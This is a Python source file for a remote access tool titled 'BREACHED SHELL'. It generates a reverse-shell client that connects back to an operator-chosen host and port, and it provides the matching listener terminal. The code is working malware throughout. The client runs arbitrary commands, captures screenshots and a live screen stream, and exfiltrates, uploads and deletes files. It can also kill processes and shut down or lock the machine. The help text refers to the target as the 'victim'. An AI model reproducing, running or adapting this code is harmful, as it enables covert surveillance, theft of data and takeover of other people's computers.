import socket
import threading
import subprocess
import os
import sys
import time
import base64
import json
import tempfile

os.system('cls' if os.name == 'nt' else 'clear')

banner = """
 ▄▄▄▄    ██▀███  ▓█████ ▄▄▄       ▄████▄   ██░ ██ ▓█████ ▓█████▄      ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓█████▄ ▓██ ▒ ██▒▓█   ▀▒████▄    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ██▌   ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒██▒ ▄██▓██ ░▄█ ▒▒███  ▒██  ▀█▄  ▒▓█    ▄ ▒██▀▀██░▒███   ░██   █▌   ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▒██░█▀  ▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ░▓█▄   ▌     ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▓█  ▀█▓░██▓ ▒██▒░▒████▒▓█   ▓██▒▒ ▓███▀ ░░▓█▒░██▓░▒████▒░▒████▓    ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░▒▓███▀▒░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░ ▒▒▓  ▒    ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
▒░▒   ░   ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░ ░ ▒  ▒    ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░    ░   ░░   ░    ░    ░   ▒   ░         ░  ░░ ░   ░    ░ ░  ░    ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
 ░         ░        ░  ░     ░  ░░ ░       ░  ░  ░   ░  ░   ░             ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
      ░                          ░                        ░                                                 
"""
print(banner)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_downloads_path():
    if os.name == 'nt':
        return os.path.join(os.environ.get('USERPROFILE', 'C:\\Users\\Default'), 'Downloads')
    else:
        return os.path.join(os.path.expanduser('~'), 'Downloads')

def generate_python_shell(host, port):
    return f'''import socket, subprocess, os, threading, time, base64, sys, json

def get_downloads_path():
    if os.name == 'nt':
        return os.path.join(os.environ.get('USERPROFILE', 'C:\\\\Users\\\\Default'), 'Downloads')
    else:
        return os.path.join(os.path.expanduser('~'), 'Downloads')

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect(("{host}", {port}))
            while True:
                try:
                    d = s.recv(65536).decode()
                    if not d:
                        break
                    
                    if d == "sysinfo":
                        info = {{
                            "hostname": os.environ.get('COMPUTERNAME', 'Unknown'),
                            "user": os.environ.get('USERNAME', 'Unknown'),
                            "os": "Windows"
                        }}
                        s.send(json.dumps(info).encode())
                    
                    elif d == "screenshot":
                        try:
                            from PIL import ImageGrab
                            import io
                            ss = ImageGrab.grab()
                            b = io.BytesIO()
                            ss.save(b, format="JPEG", quality=70)
                            b64 = base64.b64encode(b.getvalue()).decode()
                            s.send(b64.encode())
                        except Exception as e:
                            s.send(f"Screenshot failed: {{e}}".encode())
                    
                    elif d == "live_start":
                        live = True
                        while live:
                            try:
                                from PIL import ImageGrab
                                import io
                                ss = ImageGrab.grab()
                                b = io.BytesIO()
                                ss.save(b, format="JPEG", quality=30)
                                b64 = base64.b64encode(b.getvalue()).decode()
                                s.send(f"LIVE_START\\n{{b64}}\\nLIVE_END".encode())
                                time.sleep(0.3)
                            except:
                                break
                    
                    elif d == "live_stop":
                        live = False
                        s.send(b"Live view stopped")
                    
                    elif d == "lock":
                        import ctypes
                        ctypes.windll.user32.LockWorkStation()
                        s.send(b"PC locked")
                    
                    elif d == "shutdown":
                        os.system("shutdown /s /t 0")
                        s.send(b"Shutting down")
                    
                    elif d == "restart":
                        os.system("shutdown /r /t 0")
                        s.send(b"Restarting")
                    
                    elif d == "logout":
                        os.system("shutdown /l")
                        s.send(b"Logging out")
                    
                    elif d == "ps":
                        p = subprocess.run("tasklist", shell=True, capture_output=True)
                        s.send(p.stdout)
                    
                    elif d.startswith("kill"):
                        pid = d.split()[1]
                        os.system(f"taskkill /PID {{pid}} /F")
                        s.send(f"Killed {{pid}}".encode())
                    
                    elif d.startswith("run"):
                        prog = d[4:]
                        subprocess.Popen(prog, shell=True)
                        s.send(f"Started {{prog}}".encode())
                    
                    elif d.startswith("download"):
                        filepath = d.split()[1]
                        try:
                            with open(filepath, 'rb') as f:
                                data = base64.b64encode(f.read()).decode()
                            s.send(data.encode())
                        except Exception as e:
                            s.send(f"Download failed: {{e}}".encode())
                    
                    elif d.startswith("upload"):
                        parts = d.split(maxsplit=1)
                        if len(parts) == 2:
                            filename = parts[1].strip('"')
                            downloads_dir = get_downloads_path()
                            save_path = os.path.join(downloads_dir, os.path.basename(filename))
                            s.send(b"READY")
                            file_data = s.recv(10485760)
                            try:
                                with open(save_path, 'wb') as f:
                                    f.write(file_data)
                                s.send(f"Uploaded to {{save_path}}".encode())
                            except Exception as e:
                                s.send(f"Upload failed: {{e}}".encode())
                        else:
                            s.send(b"Usage: upload <filename>")
                    
                    elif d.startswith("delete"):
                        filepath = d.split()[1]
                        try:
                            os.remove(filepath)
                            s.send(f"Deleted {{filepath}}".encode())
                        except:
                            s.send(b"Delete failed")
                    
                    elif d.startswith("list"):
                        dirpath = d.split()[1] if len(d.split()) > 1 else "."
                        try:
                            files = os.listdir(dirpath)
                            result = "\\n".join(files)
                            s.send(result.encode())
                        except:
                            s.send(b"List failed")
                    
                    elif d.startswith("cd"):
                        path = d.split()[1] if len(d.split()) > 1 else os.path.expanduser("~")
                        try:
                            os.chdir(path)
                            s.send(f"Changed to {{os.getcwd()}}".encode())
                        except:
                            s.send(b"CD failed")
                    
                    elif d == "pwd":
                        s.send(os.getcwd().encode())
                    
                    elif d == "ipconfig":
                        p = subprocess.run("ipconfig", shell=True, capture_output=True)
                        s.send(p.stdout)
                    
                    elif d == "whoami":
                        p = subprocess.run("whoami", shell=True, capture_output=True)
                        s.send(p.stdout)
                    
                    elif d.startswith("msgbox"):
                        msg = d[7:]
                        import ctypes
                        ctypes.windll.user32.MessageBoxW(0, msg, "Message", 0)
                        s.send(b"Message shown")
                    
                    elif d == "help":
                        s.send(b"Commands: sysinfo, screenshot, live_start, live_stop, lock, shutdown, restart, logout, ps, kill, run, download, upload, delete, mkdir, rmdir, list, cd, pwd, ipconfig, whoami, msgbox, help, exit")
                    
                    elif d == "exit":
                        s.close()
                        break
                    
                    else:
                        p = subprocess.run(d, shell=True, capture_output=True)
                        s.send(p.stdout + p.stderr)
                except:
                    break
        except:
            time.sleep(5)
            continue

connect()
'''

class LiveViewGUI:
    def __init__(self, client_socket):
        self.client = client_socket
        self.running = True
        self.setup_gui()
    
    def setup_gui(self):
        import tkinter as tk
        from PIL import Image, ImageTk
        import io
        
        self.root = tk.Tk()
        self.root.title("Live View")
        self.root.geometry("900x700")
        self.root.configure(bg='black')
        
        self.canvas = tk.Canvas(self.root, bg='black', width=850, height=600)
        self.canvas.pack(pady=10)
        
        btn_frame = tk.Frame(self.root, bg='black')
        btn_frame.pack(pady=10)
        
        self.stop_btn = tk.Button(btn_frame, text="STOP", command=self.stop_view,
                                   bg='red', fg='white', padx=20)
        self.stop_btn.pack()
        
        self.receive_thread = threading.Thread(target=self.receive_frames, daemon=True)
        self.receive_thread.start()
        
        self.root.protocol("WM_DELETE_WINDOW", self.stop_view)
        self.root.mainloop()
    
    def receive_frames(self):
        from PIL import Image, ImageTk
        import io
        import base64
        
        buffer = ""
        while self.running:
            try:
                data = self.client.recv(65536).decode('utf-8', errors='ignore')
                if not data:
                    break
                buffer += data
                
                while "LIVE_START" in buffer and "LIVE_END" in buffer:
                    start = buffer.find("LIVE_START")
                    end = buffer.find("LIVE_END", start)
                    
                    if start != -1 and end != -1:
                        img_part = buffer[start + 11:end]
                        buffer = buffer[end + 9:]
                        
                        try:
                            img_data = base64.b64decode(img_part)
                            image = Image.open(io.BytesIO(img_data))
                            image = image.resize((850, 600), Image.Resampling.LANCZOS)
                            photo = ImageTk.PhotoImage(image)
                            self.root.after(0, self.update_image, photo)
                        except:
                            pass
                    else:
                        break
            except:
                break
    
    def update_image(self, photo):
        self.canvas.delete("all")
        self.canvas.create_image(425, 300, image=photo, anchor='center')
        self.canvas.image = photo
    
    def stop_view(self):
        self.running = False
        try:
            self.client.send(b"live_stop")
        except:
            pass
        self.root.destroy()

class ReverseShellTerminal:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server = None
        self.client = None
        self.client_addr = None
        self.running = True
        self.live_view_active = False
    
    def start_listener(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        
        print("waiting for connection...\n")
        
        self.client, self.client_addr = self.server.accept()
        print("\nconnected! '!live' for live view\n")
        
        self.command_loop()
    
    def command_loop(self):
        while self.running:
            try:
                cmd = input(f"\n> ").strip()
                
                if not cmd:
                    continue
                
                if cmd == "!live":
                    self.start_live_view()
                
                elif cmd == "help":
                    self.show_help()
                
                elif cmd == "exit":
                    self.client.send(b"exit")
                    print("closing connection...")
                    self.running = False
                    break
                
                elif cmd == "clear":
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(banner)
                    print("REVERSE SHELL")
                    print("\nhelp = all commands \n")
                
                elif cmd.startswith("upload "):
                    local_file = cmd[7:].strip('"')
                    if os.path.exists(local_file):
                        with open(local_file, 'rb') as f:
                            file_data = f.read()
                        self.client.send(f"upload {os.path.basename(local_file)}".encode())
                        time.sleep(0.5)
                        self.client.send(file_data)
                        time.sleep(1)
                        self.receive_data()
                    else:
                        print(f"file not found: {local_file}")
                
                elif cmd.startswith("download "):
                    self.client.send(cmd.encode())
                    time.sleep(1)
                    data = self.client.recv(10485760)
                    if data and not data.startswith(b"download failed"):
                        try:
                            decoded_data = base64.b64decode(data.decode())
                            filename = cmd[9:].split('\\')[-1]
                            downloads = get_downloads_path()
                            save_path = os.path.join(downloads, filename)
                            with open(save_path, 'wb') as f:
                                f.write(decoded_data)
                            print(f"downloaded to: {save_path}")
                        except:
                            print("failed to decode download data")
                    else:
                        print("download failed")
                
                elif cmd == "screenshot":
                    self.client.send(b"screenshot")
                    print("taking screenshot from victim...")
                    time.sleep(2)
                    data = self.client.recv(10485760)
                    if data and not data.startswith(b"screenshot failed"):
                        try:
                            decoded_data = base64.b64decode(data.decode())
                            downloads = get_downloads_path()
                            save_path = os.path.join(downloads, f"screenshot_{int(time.time())}.jpg")
                            with open(save_path, 'wb') as f:
                                f.write(decoded_data)
                            print(f"screenshot saved to: {save_path}")
                        except Exception as e:
                            print(f"failed to decode screenshot: {e}")
                    else:
                        print("screenshot failed")
                
                else:
                    self.client.send(cmd.encode())
                    time.sleep(0.5)
                    self.receive_data()
                
            except KeyboardInterrupt:
                print("\ninterrupted")
                self.running = False
                break
            except Exception as e:
                print(f"error: {e}")
                break
        
        if self.client:
            self.client.close()
        if self.server:
            self.server.close()
    
    def show_help(self):
        print("""
           COMMANDS

!live           start live screen view
sysinfo         get victim system info
screenshot      take screenshot (saved to your downloads)
lock            lock victim PC
shutdown        shutdown victim PC 
restart         restart victim PC 
logout          log out victim user
ps              list processes
kill [PID]      kill process by PID
run [program]   run program on victim
download [path] download file from victim (saved to your downloads)
upload [file]   upload file to victim (saved to victim's downloads)
delete [path]   delete file on victim
list [path]     list directory contents
cd [path]       change directory
pwd             show current directory
ipconfig        show network config
whoami          show current user
msgbox [text]   show message box
help            show this help
clear           clear screen
exit            close connection

           EXAMPLES
upload C:\\Users\\Desktop\\program.exe
download C:\\Users\\Desktop\\secret.txt
""")
    
    def receive_data(self):
        try:
            self.client.settimeout(1)
            data_received = False
            while True:
                try:
                    data = self.client.recv(65536)
                    if not data:
                        break
                    decoded = data.decode('utf-8', errors='ignore')
                    
                    try:
                        info = json.loads(decoded)
                        if "hostname" in info:
                            print(f"\n=== SYSTEM INFORMATION ===")
                            for k, v in info.items():
                                print(f"{k.upper()}: {v}")
                            data_received = True
                    except:
                        if decoded.strip():
                            print(decoded)
                            data_received = True
                except socket.timeout:
                    break
            self.client.settimeout(None)
            if not data_received:
                print("executed")
        except:
            pass
    
    def start_live_view(self):
        print("starting live view...")
        self.client.send(b"live_start")
        
        def run_gui():
            try:
                gui = LiveViewGUI(self.client)
            except Exception as e:
                print(f"error: {e}")
            finally:
                print("\nlive view stopped")
        
        live_thread = threading.Thread(target=run_gui, daemon=True)
        live_thread.start()

def main():
    local_ip = get_local_ip()
    
    print("1 - generate python shell")
    print("2 - start listener")
    print("3 - generate & start listener")
    
    choice = input("\nchoice: ").strip()
    
    print("\nIP:")
    host = input("> ").strip()
    if not host:
        host = local_ip
    
    print("\nPort:")
    port_input = input("> ").strip()
    port = int(port_input) if port_input else 4444
    
    if choice == "1":
        code = generate_python_shell(host, port)
        downloads = get_downloads_path()
        save_path = os.path.join(downloads, "client.py")
        
        with open(save_path, 'w') as f:
            f.write(code)
  
    elif choice == "2":
        shell = ReverseShellTerminal(host, port)
        shell.start_listener()
    
    elif choice == "3":
        code = generate_python_shell(host, port)
        downloads = get_downloads_path()
        save_path = os.path.join(downloads, "client.py")
        
        with open(save_path, 'w') as f:
            f.write(code)
        
        time.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')
        print(banner)
        print("REVERSE SHELL")
        shell = ReverseShellTerminal(host, port)
        shell.start_listener()
    
    else:
        print("invalid choice")

if __name__ == "__main__":
    main()